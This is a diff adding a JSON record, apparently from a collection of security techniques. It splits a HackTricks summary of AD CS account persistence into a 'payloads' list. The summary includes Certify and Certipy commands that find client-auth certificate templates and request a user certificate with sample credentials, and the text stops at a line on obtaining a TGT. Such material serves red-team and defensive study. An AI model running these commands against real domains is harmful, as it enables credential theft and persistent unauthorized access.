@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_af696421b866",
+  "category": "windows-hardening",
+  "title": "account persistence",
+  "description": "# AD CS Account Persistence\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n**This is a small summary of the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**\n\n## Understanding Active User Credential Theft with Certificates \u2013 PERSIST1\n\nIn a scenario where a certificate that allows domain authentication can be requested by a user, an attacker has the op",
+  "payloads": [
+    "# AD CS Account Persistence",
+    "{{#include ../../../banners/hacktricks-training.md}}",
+    "**This is a small summary of the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**",
+    "## Understanding Active User Credential Theft with Certificates \u2013 PERSIST1",
+    "In a scenario where a certificate that allows domain authentication can be requested by a user, an attacker has the opportunity to request and steal this certificate to maintain persistence on a network. By default, the `User` template in Active Directory allows such requests, though it may sometimes be disabled.",
+    "Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:",
+    "```bash",
+    "# Enumerate client-auth capable templates",
+    "Certify.exe find /clientauth",
+    "# Request a user cert from an Enterprise CA (current user context)",
+    "Certify.exe request /ca:CA-SERVER\\CA-NAME /template:User",
+    "# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default",
+    "certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\\CA-NAME' -template 'User' -out user.pfx",
+    "A certificate\u2019s power lies in its ability to authenticate as the user it belongs to, regardless of password changes, as long as the certificate remains valid.",
+    "You can convert PEM to PFX and use it to obtain a TGT:"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.md"
+  ]
+}
